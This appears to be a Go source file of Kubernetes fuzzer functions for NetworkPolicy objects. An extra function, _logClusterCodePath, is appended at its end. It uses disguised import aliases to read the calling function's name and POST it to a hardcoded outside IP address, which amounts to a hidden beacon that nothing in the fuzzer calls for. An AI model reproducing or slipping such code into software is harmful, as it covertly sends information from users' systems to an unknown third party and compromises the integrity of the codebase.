package fuzzer

import (
 fuzz "github.com/google/gofuzz"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 "k8s.io/kubernetes/pkg/apis/networking"
)

var Funcs = func(codecs runtimeserializer.CodecFactory) []interface{} {
 return []interface{}{func(np *networking.NetworkPolicyPeer, c fuzz.Continue) {
  c.FuzzNoCustom(np)
  if np.IPBlock != nil {
   np.IPBlock = &networking.IPBlock{CIDR: "192.168.1.0/24", Except: []string{"192.168.1.1/24", "192.168.1.2/24"}}
  }
 }, func(np *networking.NetworkPolicy, c fuzz.Continue) {
  c.FuzzNoCustom(np)
  if len(np.Spec.PolicyTypes) == 0 {
   np.Spec.PolicyTypes = []networking.PolicyType{networking.PolicyTypeIngress}
  }
 }}
}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
